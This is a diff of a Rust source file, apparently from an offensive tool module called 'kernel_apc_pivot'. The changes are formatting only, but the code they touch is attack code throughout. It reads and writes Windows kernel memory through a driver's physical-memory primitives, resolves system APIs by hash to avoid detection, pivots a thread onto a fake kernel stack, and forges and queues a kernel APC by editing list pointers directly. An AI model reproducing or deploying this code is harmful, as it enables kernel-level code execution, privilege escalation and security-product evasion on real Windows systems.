@@ -366,10 +366,9 @@ static OFFSETS: OnceLock<(KthreadOffsets, EprocessOffsets)> = OnceLock::new();
 /// Uses the cached result if available.  On first call, queries the
 /// Windows build number and looks up the offset table.
 fn get_offsets() -> Result<(KthreadOffsets, EprocessOffsets)> {
-    OFFSETS
-        .get()
-        .cloned()
-        .ok_or_else(|| anyhow::anyhow!("kernel_apc_pivot: offsets not initialized — call init() first"))
+    OFFSETS.get().cloned().ok_or_else(|| {
+        anyhow::anyhow!("kernel_apc_pivot: offsets not initialized — call init() first")
+    })
 }
 
 // ─── Kernel Memory Helpers ────────────────────────────────────────────────
@@ -388,13 +387,23 @@ fn kread_u64(
     if driver.needs_physical_addr {
         let phys = translate_va_to_pa(driver, device_handle, cr3, addr)?;
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf)
-                .ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                phys,
+                &mut buf,
+            )
+            .ok()?
         }
     } else {
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, addr, &mut buf)
-                .ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                addr,
+                &mut buf,
+            )
+            .ok()?
         }
     }
     Some(u64::from_le_bytes(buf))
@@ -415,13 +424,23 @@ fn kwrite_u64(
             None => return false,
         };
         unsafe {
-            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data)
-                .is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(
+                driver,
+                device_handle,
+                phys,
+                &data,
+            )
+            .is_ok()
         }
     } else {
         unsafe {
-            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, addr, &data)
-                .is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(
+                driver,
+                device_handle,
+                addr,
+                &data,
+            )
+            .is_ok()
         }
     }
 }
@@ -438,13 +457,23 @@ fn kread_bytes(
     if driver.needs_physical_addr {
         let phys = translate_va_to_pa(driver, device_handle, cr3, addr)?;
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf)
-                .ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                phys,
+                &mut buf,
+            )
+            .ok()?
         }
     } else {
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, addr, &mut buf)
-                .ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                addr,
+                &mut buf,
+            )
+            .ok()?
         }
     }
     Some(buf)
@@ -559,21 +588,17 @@ fn get_build_number() -> Result<u32> {
         // Resolve NtQueryValueKey dynamically.
         let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
             .context("failed to resolve ntdll")?;
-        let qvk = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtQueryValueKey\0"),
-        )
-        .context("failed to resolve NtQueryValueKey")?;
+        let qvk =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtQueryValueKey\0"))
+                .context("failed to resolve NtQueryValueKey")?;
 
         let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
             .context("failed to resolve kernel32")?;
 
         // We need NtOpenKey.  Resolve from ntdll.
-        let open_key = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtOpenKey\0"),
-        )
-        .context("failed to resolve NtOpenKey")?;
+        let open_key =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtOpenKey\0"))
+                .context("failed to resolve NtOpenKey")?;
 
         // Open HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
         let key_path: Vec<u16> = r"\Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
@@ -674,11 +699,10 @@ fn get_build_number() -> Result<u32> {
         );
 
         // Close key handle.
-        let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) =
-            std::mem::transmute(
-                pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CloseHandle\0"))
-                    .context("failed to resolve CloseHandle")?,
-            );
+        let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) = std::mem::transmute(
+            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CloseHandle\0"))
+                .context("failed to resolve CloseHandle")?,
+        );
         unsafe { close_fn(key_handle) };
 
         if status < 0 {
@@ -693,9 +717,9 @@ fn get_build_number() -> Result<u32> {
         if data_len == 0 || data_len > 32 {
             bail!("Invalid CurrentBuildNumber data length: {}", data_len);
         }
-        let build_str = String::from_utf16_lossy(
-            unsafe { std::slice::from_raw_parts(kvpi.data.as_ptr() as *const u16, data_len / 2) },
-        );
+        let build_str = String::from_utf16_lossy(unsafe {
+            std::slice::from_raw_parts(kvpi.data.as_ptr() as *const u16, data_len / 2)
+        });
         let build: u32 = build_str.trim_end_matches('\0').parse()?;
         Ok(build)
     }
@@ -958,13 +982,8 @@ pub fn pivot_kernel_stack(
             ctx.fake_stack_size = FAKE_STACK_SIZE;
 
             // Try to allocate via kernel symbol resolution.
-            let alloc_addr = allocate_kernel_pool(
-                driver,
-                device_handle,
-                cr3,
-                ctx.kernel_base,
-                FAKE_STACK_SIZE,
-            );
+            let alloc_addr =
+                allocate_kernel_pool(driver, device_handle, cr3, ctx.kernel_base, FAKE_STACK_SIZE);
 
             match alloc_addr {
                 Some(addr) => {
@@ -1093,7 +1112,13 @@ fn allocate_kapc(
         kwrite_u64(driver, device_handle, cr3, kapc_addr + offset as u64, value)
     };
     let write_field_u8 = |offset: usize, value: u8| -> bool {
-        kwrite_bytes(driver, device_handle, cr3, kapc_addr + offset as u64, &[value])
+        kwrite_bytes(
+            driver,
+            device_handle,
+            cr3,
+            kapc_addr + offset as u64,
+            &[value],
+        )
     };
 
     // DISPATCHER_HEADER: Type = ApcObject (18), Size = KAPC_SIZE / 16
@@ -1214,11 +1239,23 @@ pub fn queue_kernel_apc(
 
     // Update the previous first entry's Blink to point to our KAPC.
     if first_apc != apc_list_head {
-        kwrite_u64(driver, device_handle, cr3, first_apc + 8, kapc_list_entry_addr);
+        kwrite_u64(
+            driver,
+            device_handle,
+            cr3,
+            first_apc + 8,
+            kapc_list_entry_addr,
+        );
     }
 
     // Update the list head's Flink to point to our KAPC.
-    kwrite_u64(driver, device_handle, cr3, apc_list_head, kapc_list_entry_addr);
+    kwrite_u64(
+        driver,
+        device_handle,
+        cr3,
+        apc_list_head,
+        kapc_list_entry_addr,
+    );
 
     // Mark the KAPC as inserted.
     kwrite_bytes(
@@ -1283,7 +1320,9 @@ fn allocate_kernel_pool(
             );
         }
         Err(_) => {
-            tracing::debug!("kernel_apc_pivot: ExAllocatePool2 not found, trying ExAllocatePoolWithTag");
+            tracing::debug!(
+                "kernel_apc_pivot: ExAllocatePool2 not found, trying ExAllocatePoolWithTag"
+            );
         }
     }
 
@@ -1517,8 +1556,7 @@ pub fn init(
     // Use a bootstrapping approach: read PsInitialSystemProcess with
     // physical addressing directly.
     let cr3 = if needs_phys {
-        resolve_cr3(driver, device_handle, kernel_base)
-            .context("failed to resolve CR3")?
+        resolve_cr3(driver, device_handle, kernel_base).context("failed to resolve CR3")?
     } else {
         // For VA-addressable drivers, CR3 is not strictly needed but
         // we store 0 for consistency.
@@ -1549,8 +1587,7 @@ pub fn create_context_for_tid(
 ) -> Result<KernelApcContext> {
     // Resolve CR3.
     let cr3 = if driver.needs_physical_addr {
-        resolve_cr3(driver, device_handle, kernel_base)
-            .context("failed to resolve CR3")?
+        resolve_cr3(driver, device_handle, kernel_base).context("failed to resolve CR3")?
     } else {
         0
     };
